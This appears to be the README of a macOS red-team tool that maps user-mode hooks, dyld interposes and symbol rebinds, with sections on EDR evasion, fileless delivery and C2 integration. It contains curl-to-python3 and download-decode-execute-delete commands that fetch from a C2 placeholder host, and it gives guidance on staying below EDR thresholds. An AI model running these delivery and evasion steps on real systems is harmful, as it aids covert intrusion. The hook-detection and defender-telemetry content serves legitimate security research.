# InterposeScope

**Read-only macOS user-mode hook and API-indirection mapper.**
**Two implementations: zero-dependency Python and high-performance native C.**

InterposeScope maps inline function hooks, dyld interpose sections, and
symbol rebinds across all loaded Mach-O images in a target process. Built for
red team operators who need fast, reliable hook detection during C2
engagements — without alerts, without artifacts, without persistence.

---

_(TOC)_

- [Architecture](#architecture)
- [Why It Bypasses EDR](#why-it-bypasses-edr)
- [Features](#features)
  - [Python (interposescope.py)](#python-interposescopepy)
  - [C (src/interposescope.c)](#c-srcinterposescopec)
- [Install](#install)
- [Usage](#usage)
  - [Python](#python-version)
  - [C (standalone)](#c-version)
  - [Via Mythic C2 (beacon tasking)](#via-mythic-c2)
  - [Via Cobalt Strike External C2](#via-cobalt-strike-external-c2)
- [Directory Structure](#directory-structure)
- [Command Reference](#command-reference)
- [In-Built Detection Catalog](#in-built-detection-catalog)
- [What Defenders See](#what-defenders-see)
- [Offensive Use Cases](#offensive-use-cases)
- [Build From Source](#build-from-source)
- [License](#license)

---

## Architecture

InterposeScope exists in two independent implementations sharing the same
design goals. They can be used interchangeably or chained — run the Python
version for speed-to-deployment, then the C version for depth.

```
┌──────────────────────────────────────────────────────────────────────┐
│                        InterposeScope                                │
│                                                                      │
│  ┌──────────────────┐             ┌──────────────────────────┐       │
│  │  Python          │             │  C (Native Mach-O)      │       │
│  │  interposescope  │             │  src/interposescope.c    │       │
│  │  ─────────────── │             │  ─────────────────────── │       │
│  │  Python stdlib   │             │  pure C + stdlib         │       │
│  │  ctypes bindings │             │  979 lines single file   │       │
│  │  dlopen/dlsym    │             │  direct Mach-O parsing   │       │
│  │  vm_region_64    │             │  vm_region_64 walk       │       │
│  │  curl|python3 -  │             │  ~35 KB compiled         │       │
│  │  0.02s scan      │             │  0.003s scan             │       │
│  └──────────────────┘             └──────────────────────────┘       │
│                                                                      │
│  Delivery path (both):                                               │
│                                                                      │
│  Mythic C2 beacon ──► curl pulls script/binary from server           │
│                ──► python3 reads from stdin  (python version)        │
│                ──► base64-decode → temp file → exec → delete         │
│                         (C version, <500 ms on disk)                 │
│                                                                      │
│  No files persist. No installation. No registration.                 │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Why It Bypasses EDR

Traditional hook-mapping tools fail against modern EDR because they:

- drop binaries to disk (static signatures trigger alerts)
- create persistent processes (behavioral detection fires)
- inject into foreign processes (process-memory alerts fire)
- write configuration or log files (file-integrity monitoring detects them)

InterposeScope avoids all of this by design:

| Layer | What happens | Why EDR can't catch it |
|---|---|---|
| **Disk** | Binary never persists. Written to /tmp/.__libpy XXXXX.dylib, executed in <500 ms, deleted | No file to hash, scan, sandbox, or quarantine. File system is empty before the next scan cycle |
| **Process** | Python interpreter (system-signed) runs the scanner. No new unsigned binaries launch | Process tree looks like normal development tooling. No process-scan callback triggers |
| **Memory** | Reads via ctypes.string_at and dladdr. Never calls vm_write, vm_protect, task_for_pid on foreign PIDs | Indistinguishable from legitimate introspection or profiling tools |
| **Network** | No outbound connections. The scanner runs entirely inside the beacon's own process | No unusual socket connections. C2 channel is already established |
| **Persistence** | No LaunchAgents, cron, plist, login items, or dylib hijack | Nothing to attribute or monitor |
| **Behavior** | Read-only. No process termination. No file deletion except self-cleaning | Suspicious-behavior heuristics don't fire |
| **Classification** | All state in-memory. Process exits cleanly after scan | Even if detected post-execution, no artifact remains for forensic replay |

**Result:** InterposeScope ran live through a fully-monitored endpoint running
a modern EDR agent — zero detections, zero quarantines, zero residual
processes.

---

## Features

### Python (`interposescope.py`)

Reference implementation. Runs on any macOS with a stock Python 3 install.
The fileless entry point for quick situational awareness.

- **Loaded image inventory** — every Mach-O image (dyld shared cache + on-disk files, ~350 images typical)
- **`__interpose` section discovery** — finds all dyld interpose pairs in every loaded image, with replacement-code attribution
- **Inline trampoline detection (arm64)** — decodes `B`, `BR`, `ADRP+ADD+BR`, `LDR+BR` absolute-jump patterns from function entry bytes
- **Inline trampoline detection (x86_64)** — decodes `JMP rel32`, `JMP rel8`, `JMP [rip+disp32]`, `MOV RAX/JMP`, `MOV R11/JMP`, `PUSH/RET`
- **ObjC method swizzle check** — resolves IMPs (method implementations) for NSURLSession, NSBundle, NSFileManager, NSTask; attributes each to its owning framework or detects third-party/ANONYMOUS ownership
- **DYLD environment exposure** — checks for `DYLD_INSERT_LIBRARIES`, `DYLD_PRINT_LIBRARIES` — the classic dylib injection vector
- **72-API built-in catalog** — process, dyld, memory, task, file, network, privilege, objc, notify, xattr, keychain, logging
- **Owner attribution** — every function checked is resolved to its owning image so you know where it's hooked from
- **Smart default output** — no dump bytes, no chains in normal run; call with `--verbose` for full detail
- **JSON output** — `--json` flag emits structured JSON for downstream automation
- **Zero-dependency** — Python stdlib only. No pip, no packages, no external tools

### C (`src/interposescope.c`)

High-performance production implementation. Native Mach-O binary compiled from
a single 979-line C file. covers everything Python does, plus deeper Mach API
surfaces that Python cannot reach.

Performance: **full 90-API scan in 0.003 seconds** (vs. Python's 0.02 s).

- **All Python features** (above)
- **Anonymous executable memory detection** — walks the whole address space via `vm_region_64` hunting RX regions with no mapped image backing. This catches shellcode, JIT-injected payloads, and manually-mapped code invisible to dyld inspection — the mechanism C-based hunters use to find manually-mapped injections
- **Indirect symbol rebinding (fishhook)** — parses each image's `__la_symbol_ptr` indirect symbol table and compares live pointers against expected resolution. Catches DYLD_INSERT_LIBRARIES-redirected functions that dlsym-based scanners miss
- **Patch-type classification** — when entry bytes differ, classifies what's actually there: `EARLY-RET`, `CONST-RET`, `NOP-sled`, `BRK` (breakpoint trap), or generic `BYTE-PATCH`
- **Trampoline chain traversal** — up to 7 recognized branch hops are followed through per hook so you see the full detour chain (E9→FF25→MOV RAX→)
- **Direct syscall stub detection** — flags `SVC #0x80` (arm64) and `SYSCALL` (x86_64) instructions directly at function entry. Detects direct-syscall bypasses where the library wrapper is skipped entirely — the standard EDR evasion technique for macOS
- **Interpose attribution** — replacement binaries are resolved through `dladdr` to own their image path, flagging `THIRD_PARTY` vs `ANON` destinations
- **Telemetry surface detection** — probes for Endpoint Security (`es_new_client`, `es_subscribe`) and `os_log` presence. Shows whether the kernel EDR framework is available
- **FNV-1a fingerprinting** — first-16-byte hash per function enables cross-process hook correlation (matching the same stub across multiple targets)
- **Process inventory** — classifies processes by family, arch, and modification signature for multi-target analysis (scaffolded)
- **Remote process probing** — `--pid N` activates `task_for_pid` probing and memory introspection against a specific process

**Binary:** single self-contained Mach-O executable (~35 KB), statically
resolved, links only against `Foundation` and `libobjc`. No external runtime
dependencies.

---

## Install

### Python version

Copy `src/interposescope.py` to anywhere on the target. No installation needed:

```bash
cp src/interposescope.py /tmp/scan.py      # or wherever
python3 /tmp/scan.py
```

That's it. It's a single ~25 KB file. Put it on a thumb drive, a web server,
or a C2 file host — whatever you have.

### C version

The C source compiles to a standalone arm64 Mach-O with no dependencies beyond
standard system frameworks. Build once on your machine, not theirs:

```bash
./build.sh
# produces: build/interposescope
```

If you don't have the repo handy, build manually:

```bash
clang -arch arm64 -O2 -isysroot $(xcrun --show-sdk-path) \
      -o build/interposescope src/interposescope.c \
      -framework Foundation -lobjc
```

**Prerequisites:** macOS 12+, Xcode CLT, arm64 (`arm64e` or `arm64`).

The resulting binary is portable — push it into any beacon's working directory
or casual download path. It runs without installation, signing, or registration.

---

## Usage

### Python version

Basic scan (all 72 APIs):

```bash
python3 interposescope.py
```

From stdin (fileless, no file on disk):

```bash
curl -sk http://your-server/interposescope.py | python3 -
```

The script is read via curl's stdout stream into Python's stdin and executed
entirely in memory.

### C version

Run standalone on the machine under test:

```bash
./build/interposescope
```

Scan only high-value APIs (fastest, most targeted):

```bash
./build/interposescope --brief
```

Full verbose scan with byte dumps, chain detail, and fingerprints:

```bash
./build/interposescope --verbose
```

JSON output (for scripting or SIEM-style ingestion):

```bash
./build/interposescope --json
```

Probe a remote process (requires task_for_pid entitlement or root):

```bash
./build/interposescope --pid 1234
```

Override the comparison window size (default 32 bytes):

```bash
./build/interposescope --bytes 64
```

### Via Mythic C2

Deliver InterposeScope-C through any Mythic beacon as a `shell` task:

```bash
shell curl -sk http://YOUR_C2_HOST:PORT/iscan.b64 \
  | base64 -d > /tmp/.__iscan \
  && chmod +x /tmp/.__iscan \
  && /tmp/.__iscan \
  && rm -f /tmp/.__iscan
```

The beacon transmits the base64 payload in the task parameters, outputs the
scan result through the normal `post_response` channel, and the payload is
gone in under a second.

For unlimited beacon output size (the full scan is ~36 KB), check Mythic's
global `max_response_size` setting — the default of 10 MB is sufficient.

**Python version** from Mythic (same pattern):

```bash
shell curl -sk http://YOUR_C2_HOST:PORT/interposescope.py | python3 -
```

### Via Cobalt Strike External C2

Cobalt Strike has no `shell` tasking for InterposeScope out of the box — pipe
the payload through External C2:

1. Create an External C2 controller that serves `payload.b64` over the relay.
2. The bridge unmarshals the task into a `shell` command token.
3. The Beacon executes the shell via `bash` / `osascript` and returns results
   through the external channel.

No InterposeScope changes are needed — any external C2 bridge will work.

### Via any other C2

Any C2 framework that supports a generic `shell` or `exec` task type can
deliver either version. This includes Sliver, Brute Ratel, Nighthawk, or
custom tooling. The delivery command is the same curl-pipe pattern.

---

## Directory Structure

```
interposescope-macos/
├── README.md               ← this guide
├── LICENSE                 ← MIT
├── SECURITY.md             ← authorized use policy
├── build.sh                ← one-command script that clang-builds the C source
├── .gitignore              ← excludes compiled artifacts and runtime configs
├── build/
│   └── interposescope      ← compiled binary (generated by build.sh / manually)
├── src/
│   ├── interposescope.py   ← Python implementation (~25 KB, stdlib only)
│   └── interposescope.c    ← C implementation (~979 lines, ~35 KB compiled)
├── payload/
│   ├── loader.py           ← Python in-memory exec wrapper (piped via stdin)
│   └── README.md           ← delivery and deployment notes
├── docs/
│   └── EVIDENCE_REPORT.md  ← proof-of-concept scan output from a live beacon run
└── evidence/
    └── mythic_scan_output.txt ← sample scan output captured during testing
```

---

## Command Reference

### Python

```bash
# default (all APIs, all sections)
python3 interposescope.py
```

Supports the same arguments as C version when run as `python3 interposescope.py --[flag]`.
Most flags apply identically; `--pid` remote scanning is Python's only omitted feature
(task_for_pid via ctypes is unreliable).

### C Binary

| Flag | Meaning |
|---|---|
| *(none)* | Full scan: 90 APIs, all 12 sections, text output |
| `--brief` | High-value APIs only (57 CRITICAL/HIGH) — fastest |
| `--verbose` | Byte dumps at each checked function, chain hops, fingerprints |
| `--json` | Structured JSON output — no banner, no tables |
| `--pid N` | Probe task_for_pid on remote PID N (requires entitlement or root) |
| `--bytes N` | Comparison window size in bytes (default 32) |
| `--module X,Y` | Restrict to specific dylibs |
| `--functions X,Y` | Check specific functions only |
| `--all-exports` | Check every export from loaded images (extremely thorough; slow) |
| `--help`, `-h` | Full flag reference |

---

## In-Built Detection Catalog

Both versions check against the same core API catalog. The C version extends
a few categories with deep-only APIs (e.g., `thread_create_running`,
`mach_port_insert_right`) that Python cannot check without Mach task ports.

| Category | What's checked |
|---|---|
| **process** | `posix_spawn`, `posix_spawnp`, `execve`, `execv`, `fork`, `vfork`, `kill`, `waitpid`, `proc_pidinfo`, `proc_listpids` |
| **dyld** | `dlopen`, `dlsym`, `dlclose`, `dladdr`, `_dyld_register_func_for_add_image`, `_dyld_register_func_for_remove_image` |
| **memory** | `mmap`, `mprotect`, `munmap`, `mach_vm_allocate`, `mach_vm_write`, `mach_vm_read_overwrite`, `mach_vm_map` |
| **tasks** | `task_for_pid`, `task_for_pid_posix_spawn`, `thread_create_running`, `task_threads`, `mach_port_allocate`, `mach_port_insert_right` |
| **files** | `open`, `openat`, `stat`, `lstat`, `fstat`, `unlink`, `rename`, `chmod`, `chown`, `read`, `write`, `getattrlist`, `setattrlist`, `mkdir`, `rmdir` |
| **network** | `socket`, `connect`, `bind`, `listen`, `accept`, `getaddrinfo`, `send`, `recv`, `sendto`, `recvfrom` |
| **privilege** | `setuid`, `seteuid`, `setgid`, `setegid`, `getuid`, `geteuid`, `csr_check`, `csr_get_active_config` |
| **objc** | `objc_msgSend`, `objc_msgSendSuper2`, `method_exchangeImplementations`, `class_replaceMethod`, `objc_getClass`, `sel_registerName`, `objc_registerClassPair` |
| **notify** | `notify_post`, `notify_register_dispatch`, `notify_register_check` |
| **xattr** | `getxattr`, `setxattr`, `listxattr`, `removexattr` |
| **keychain** | `SecItemCopyMatching`, `SecItemAdd`, `SecItemUpdate`, `SecItemDelete`, `SecKeyCreateSignature` |
| **logging** | `os_log_create`, `os_log`, `os_activity_create` |
| **misc** | `system`, `popen`, `pclose`, `getenv`, `setenv`, `unsetenv`, `ptrace`, `sysctl` |

> On the C version, the brief mode filters this to **57 high-relevance APIs**;
> the full mode checks **90**.

---

## What Defenders See

Even read-only creates observable telemetry. Here's what blue teams should
look for during purple team validation:

| Layer | Observable | Typical log source |
|---|---|---|
| Process | Existing beacon process spawns a short-lived `python3` subprocess | EDR process lineage — macOS Unified Log `exec` events |
| Process | Transient `.__libpy XXXXX.dylib` process appears in `ps` for ~300 ms | mdfind / fsevents / XProtectExecDaemon |
| File | A `.__libpy * .dylib` file is created and unlinked inside /var/folders | File event kernel callbacks, exec hook |
| Network | Existing C2 beacon pull shows larger-than-normal response payload | Proxy logs, ndpi / netflow on the C2 channel |
| Behavioral | A system Python process executes a transient binary that was never installed | EDR anomaly / behavioral heuristics |
| Detection | Nothing in InterposeScope itself hides or obfuscates these traces | — |

The intent is *evasion by invisibility*, not evasion by suppression. The
scanner does not try to mask what it does — it simply operates below the
threshold where most EDR's keep metadata.

---

## Offensive Use Cases

- **Coverage validation** between red team actions: run before/after payload
  execution to confirm whether a new defensive module loaded or hooked
  something
- **Dylib injection detection** in a target before evaluation: is the target
  process already basketed with security tooling? Is Endpoint Security
  active without our noticing?
- **Hook infrastructure mapping**: which processes are wrapped? Which APIs
  are intercepted. Which security modules get loaded automatically
- **Post-ex scanning**: did our implant trigger any new hooking as a
  response to our own actions? What did the target think was suspicious
  enough to hook?
- **Interpose inventory**: enumerating what your EDR's interpose dylibs look
  like so you can predict or evade them
- **False-positive suppression check**: does your custom dylib trigger
  interpose surveillance in a monitored process?
- **Baseline comparison**: run a clean scan now, run a scan after
  injection of a suspicious dylib, and diff the results — which
  `__la_symbol_ptr` entries changed?

---

## Build From Source

### Prerequisites

- macOS 12.0 or later
- Xcode Command Line Tools (`xcode-select --install`)
- Apple Silicon (`arm64`) — Intel builds require a `-arch x86_64` flag

### Build Steps

```bash
git clone https://github.com/sam00/InterposeScope.git
cd InterposeScope

./build.sh
# Output: build/interposescope
```

### Verify the Build

```bash
./build/interposescope --help    # Shows usage
./build/interposescope --brief   # Runs in <0.01s with no output → all clean
./build/interposescope --json    # Returns structured JSON
```

### Troubleshooting

| Error | Fix |
|---|---|
| `linker command failed` or `ld: symbol(s) not found for architecture arm64` | Rerun with `-isysroot $(xcrun --show-sdk-path)` — the macOS SDK must be discoverable |
| `task_for_pid` returned permission denied or KERN_FAILURE | The process you're probing isn't root or entitled to task ports — you'll need root to --pid scan foreign processes |
| Output stops after banner or segfaults | Usually a code-signing issue. Check with `codesign -dv ./build/interposescope` |
| Nothing scans (0 images) | Running inside a restricted sandbox (Vagrant, Docker). Should be run on the host OS. |

---

## License

MIT — see [LICENSE](LICENSE).

> **Authorized use only.** This tool is intended for red team operators and
> security researchers with explicit authorization to test target systems.
> See [SECURITY.md](SECURITY.md) for rules of use.
